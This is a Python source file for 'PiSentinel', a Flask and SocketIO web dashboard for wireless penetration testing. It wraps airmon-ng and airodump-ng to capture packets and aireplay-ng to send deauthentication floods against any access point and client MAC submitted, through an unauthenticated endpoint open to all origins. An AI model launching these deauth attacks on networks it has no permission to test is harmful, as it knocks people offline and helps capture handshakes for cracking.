"""
PiSentinel — Main Application
==============================
Flask + SocketIO server that provides a web dashboard for wireless
penetration testing on Raspberry Pi and Linux systems.
"""

import atexit
import logging
import os
import signal
import subprocess
import sys
import threading
from logging.handlers import RotatingFileHandler

from flask import Flask, render_template
from flask_socketio import SocketIO, emit

from config import (
    CAPTURE_DIR,
    DEBUG,
    HOST,
    LOG_BACKUP_COUNT,
    LOG_DIR,
    LOG_LEVEL,
    LOG_MAX_BYTES,
    LOG_STREAM_INTERVAL,
    MONITOR_INTERFACE,
    PORT,
)

# ---------------------------------------------------------------------------
# Logging setup
# ---------------------------------------------------------------------------

def _setup_logging():
    """Configure application logging with console + rotating file output."""
    os.makedirs(LOG_DIR, exist_ok=True)

    formatter = logging.Formatter(
        "[%(asctime)s] %(levelname)-8s %(name)s — %(message)s",
        datefmt="%Y-%m-%d %H:%M:%S",
    )

    # Rotating file handler
    file_handler = RotatingFileHandler(
        os.path.join(LOG_DIR, "pisentinel.log"),
        maxBytes=LOG_MAX_BYTES,
        backupCount=LOG_BACKUP_COUNT,
    )
    file_handler.setFormatter(formatter)

    # Console handler
    console_handler = logging.StreamHandler(sys.stdout)
    console_handler.setFormatter(formatter)

    root_logger = logging.getLogger()
    root_logger.setLevel(getattr(logging, LOG_LEVEL, logging.INFO))
    root_logger.addHandler(file_handler)
    root_logger.addHandler(console_handler)


_setup_logging()
logger = logging.getLogger("pisentinel")

# ---------------------------------------------------------------------------
# Flask + SocketIO
# ---------------------------------------------------------------------------

app = Flask(
    __name__,
    static_folder="../static",
    template_folder="../templates",
)
socketio = SocketIO(app, cors_allowed_origins="*")

# ---------------------------------------------------------------------------
# Global state
# ---------------------------------------------------------------------------

airodump_process = None          # subprocess.Popen handle for airodump-ng
_airodump_log_fh = None          # file handle for airodump log output
_shutdown_event = threading.Event()  # signals background threads to stop


# ---------------------------------------------------------------------------
# Cleanup / Graceful shutdown
# ---------------------------------------------------------------------------

def _cleanup():
    """Stop monitoring and release resources on shutdown."""
    global airodump_process, _airodump_log_fh

    logger.info("Cleaning up before shutdown...")
    _shutdown_event.set()

    # Terminate airodump if running
    if airodump_process and airodump_process.poll() is None:
        logger.info("Terminating airodump-ng (PID %d)...", airodump_process.pid)
        airodump_process.terminate()
        try:
            airodump_process.wait(timeout=5)
        except subprocess.TimeoutExpired:
            logger.warning("airodump-ng did not exit; killing.")
            airodump_process.kill()
        airodump_process = None

    # Close the log file handle
    if _airodump_log_fh and not _airodump_log_fh.closed:
        _airodump_log_fh.close()
        _airodump_log_fh = None

    # Attempt to restore the interface from monitor mode
    try:
        subprocess.run(
            ["airmon-ng", "stop", MONITOR_INTERFACE],
            check=False,
            capture_output=True,
            timeout=10,
        )
        logger.info("Monitor mode stopped on %s.", MONITOR_INTERFACE)
    except FileNotFoundError:
        logger.debug("airmon-ng not available; skipping interface restore.")
    except subprocess.TimeoutExpired:
        logger.warning("airmon-ng stop timed out.")


atexit.register(_cleanup)


def _signal_handler(signum, _frame):
    """Handle SIGINT / SIGTERM for graceful shutdown."""
    sig_name = signal.Signals(signum).name
    logger.info("Received %s — shutting down...", sig_name)
    _cleanup()
    sys.exit(0)


signal.signal(signal.SIGINT, _signal_handler)
signal.signal(signal.SIGTERM, _signal_handler)


# ---------------------------------------------------------------------------
# Routes
# ---------------------------------------------------------------------------

@app.route("/")
def index():
    """Serve the dashboard page."""
    return render_template("index.html")


# ---------------------------------------------------------------------------
# Background: log streaming
# ---------------------------------------------------------------------------

def _stream_logs():
    """Continuously push the airodump log content to connected clients."""
    log_file = os.path.join(CAPTURE_DIR, "airodump.log")
    logger.info("Log streaming thread started (interval=%.1fs).", LOG_STREAM_INTERVAL)

    while not _shutdown_event.is_set():
        try:
            if os.path.exists(log_file):
                with open(log_file, "r") as fh:
                    content = fh.read()
                socketio.emit("log_update", {"logs": content})
        except OSError as exc:
            logger.warning("Failed to read log file: %s", exc)
        except Exception as exc:
            logger.error("Unexpected error in log streamer: %s", exc)

        socketio.sleep(LOG_STREAM_INTERVAL)

    logger.info("Log streaming thread stopped.")


# ---------------------------------------------------------------------------
# SocketIO events
# ---------------------------------------------------------------------------

@socketio.on("start_monitoring")
def handle_start_monitoring(data):
    """Enable monitor mode and start airodump-ng."""
    global airodump_process, _airodump_log_fh

    interface = data.get("interface", MONITOR_INTERFACE)
    logger.info("Starting monitoring on interface '%s'...", interface)

    try:
        # Enable monitor mode
        result = subprocess.run(
            ["airmon-ng", "start", interface],
            check=True,
            capture_output=True,
            text=True,
            timeout=15,
        )
        logger.debug("airmon-ng start output: %s", result.stdout.strip())

        # Prepare log file
        os.makedirs(CAPTURE_DIR, exist_ok=True)
        log_file = os.path.join(CAPTURE_DIR, "airodump.log")
        _airodump_log_fh = open(log_file, "w")

        # Launch airodump-ng
        airodump_process = subprocess.Popen(
            [
                "airodump-ng",
                "-w", os.path.join(CAPTURE_DIR, "capture"),
                "--output-format", "pcap",
                interface,
            ],
            stdout=_airodump_log_fh,
            stderr=subprocess.STDOUT,
        )
        logger.info(
            "airodump-ng started (PID %d), writing to %s.",
            airodump_process.pid,
            CAPTURE_DIR,
        )
        emit("status_update", {"status": f"Monitoring started on {interface}"})

    except FileNotFoundError:
        msg = "airmon-ng / airodump-ng not found. Is aircrack-ng installed?"
        logger.error(msg)
        emit("status_update", {"status": f"Error: {msg}"})
    except subprocess.TimeoutExpired:
        msg = "airmon-ng timed out — check your adapter."
        logger.error(msg)
        emit("status_update", {"status": f"Error: {msg}"})
    except subprocess.CalledProcessError as exc:
        msg = f"airmon-ng failed (exit {exc.returncode}): {exc.stderr.strip()}"
        logger.error(msg)
        emit("status_update", {"status": f"Error: {msg}"})
    except Exception as exc:
        logger.exception("Unexpected error starting monitoring.")
        emit("status_update", {"status": f"Error: {exc}"})


@socketio.on("stop_monitoring")
def handle_stop_monitoring():
    """Stop airodump-ng and disable monitor mode."""
    global airodump_process, _airodump_log_fh

    logger.info("Stopping monitoring...")

    try:
        # Terminate airodump
        if airodump_process and airodump_process.poll() is None:
            airodump_process.terminate()
            try:
                airodump_process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                airodump_process.kill()
            logger.info("airodump-ng terminated.")
        airodump_process = None

        # Close log file handle
        if _airodump_log_fh and not _airodump_log_fh.closed:
            _airodump_log_fh.close()
            _airodump_log_fh = None

        # Restore interface
        subprocess.run(
            ["airmon-ng", "stop", MONITOR_INTERFACE],
            check=True,
            capture_output=True,
            text=True,
            timeout=15,
        )
        emit("status_update", {"status": "Monitoring stopped"})
        logger.info("Monitoring stopped and interface restored.")

    except FileNotFoundError:
        emit("status_update", {"status": "Error: airmon-ng not found."})
    except subprocess.CalledProcessError as exc:
        msg = f"Failed to stop monitor mode: {exc.stderr.strip()}"
        logger.error(msg)
        emit("status_update", {"status": f"Error: {msg}"})
    except Exception as exc:
        logger.exception("Unexpected error stopping monitoring.")
        emit("status_update", {"status": f"Error: {exc}"})


@socketio.on("send_deauth")
def handle_send_deauth(data):
    """Send deauthentication packets to a target AP/client."""
    target_ap = data.get("target_ap", "").strip()
    target_client = data.get("target_client", "FF:FF:FF:FF:FF:FF").strip()

    if not target_ap:
        emit("status_update", {"status": "Error: Target AP MAC address is required."})
        return

    logger.info(
        "Sending deauth — AP: %s, Client: %s, Interface: %s",
        target_ap, target_client, MONITOR_INTERFACE,
    )

    try:
        result = subprocess.run(
            [
                "aireplay-ng",
                "--deauth", "10",
                "-a", target_ap,
                "-c", target_client,
                MONITOR_INTERFACE,
            ],
            check=True,
            capture_output=True,
            text=True,
            timeout=30,
        )
        logger.info("Deauth sent successfully. Output: %s", result.stdout.strip())
        emit("status_update", {"status": f"Deauth attack sent to {target_ap}"})

    except FileNotFoundError:
        msg = "aireplay-ng not found. Is aircrack-ng installed?"
        logger.error(msg)
        emit("status_update", {"status": f"Error: {msg}"})
    except subprocess.TimeoutExpired:
        msg = "Deauth command timed out."
        logger.error(msg)
        emit("status_update", {"status": f"Error: {msg}"})
    except subprocess.CalledProcessError as exc:
        msg = f"Deauth failed (exit {exc.returncode}): {exc.stderr.strip()}"
        logger.error(msg)
        emit("status_update", {"status": f"Error: {msg}"})
    except Exception as exc:
        logger.exception("Unexpected error during deauth.")
        emit("status_update", {"status": f"Error: {exc}"})


@socketio.on("fetch_logs")
def handle_fetch_logs():
    """Send the list of captured .cap files to the frontend."""
    try:
        os.makedirs(CAPTURE_DIR, exist_ok=True)
        caps = sorted(
            f for f in os.listdir(CAPTURE_DIR) if f.endswith((".cap", ".pcap"))
        )
        emit("log_update", {"logs": caps if caps else ["No capture files found."]})
        logger.debug("Sent %d capture file name(s) to client.", len(caps))
    except OSError as exc:
        logger.error("Failed to list captures: %s", exc)
        emit("log_update", {"logs": [f"Error: {exc}"]})


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------

if __name__ == "__main__":
    os.makedirs(CAPTURE_DIR, exist_ok=True)
    os.makedirs(LOG_DIR, exist_ok=True)

    logger.info("=" * 50)
    logger.info("PiSentinel starting up")
    logger.info("  Capture dir  : %s", CAPTURE_DIR)
    logger.info("  Log dir      : %s", LOG_DIR)
    logger.info("  Interface    : %s", MONITOR_INTERFACE)
    logger.info("  Server       : http://%s:%d", HOST, PORT)
    logger.info("  Debug        : %s", DEBUG)
    logger.info("=" * 50)

    # Start the background log streamer
    threading.Thread(target=_stream_logs, daemon=True).start()

    # Run the server
    socketio.run(app, host=HOST, port=PORT, debug=DEBUG)